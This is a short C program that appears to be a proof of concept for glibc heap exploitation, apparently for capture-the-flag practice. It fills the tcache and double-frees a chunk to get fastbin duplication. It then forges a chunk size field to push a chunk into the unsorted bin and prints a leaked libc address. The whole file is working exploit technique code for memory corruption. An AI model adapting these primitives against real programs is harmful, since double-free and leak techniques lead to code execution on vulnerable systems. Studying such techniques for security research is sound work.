#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#define NOTE 0x80
void *dummies[7];

void * Malloc(int n){
  return malloc(n - 0x10);
}
void * Realloc(void * ptr, int n){
  return realloc(ptr, n -0x10);
}

void empty(int n){
  for(int i =0;i<7; i++){
     dummies[i] =  Malloc(n);
  }
}

void fill(){
  for(int i =0;i<7;i++){
    free(dummies[i]);
  }
}

void fast_dup(void * tar, void * tar2){
  void * a = Malloc(NOTE); //target
  void * b = Malloc(NOTE); //target2
  void * c = Malloc(NOTE);

  empty(NOTE);
  fill();
  
  free(a);
  free(b);
  free(a);
  
  empty(NOTE);

  a = Malloc(NOTE);
  *(long*)a = 0xdeadbeef;
  b = Malloc(NOTE);
  c = Malloc(NOTE);
  //void *d = Malloc(NOTE);
  //assert(a==c && a == tar && b ==d && b == tar2);
  assert(a==c && a == tar && b == tar2);



}


int main(){

  void * lb = Malloc(0xc0);
  void * flip = Malloc(NOTE);
  void * cons = Malloc(NOTE);

  lb = Realloc(lb,0xa0);
  lb = Realloc(lb,NOTE);
  free(flip);
  free(lb);
  fast_dup(lb,flip);


  free(lb);
  free(flip);

  ((char *)flip)[0] ^=0b100000;

  assert( flip == Malloc(NOTE));
  char * fake = Malloc(NOTE);
  empty(0xa0);
  fill(0xa0);

  
  
  //overwrite lb size with edit
  ((char *)fake)[0x18] = 0xa1;
  //free lb -> unsorted bin
  free(lb);
  //read from lb
  printf("libc leak: %p\n", *(long*)lb);
  printf("libc malloc: %p\n", &malloc);
  
}
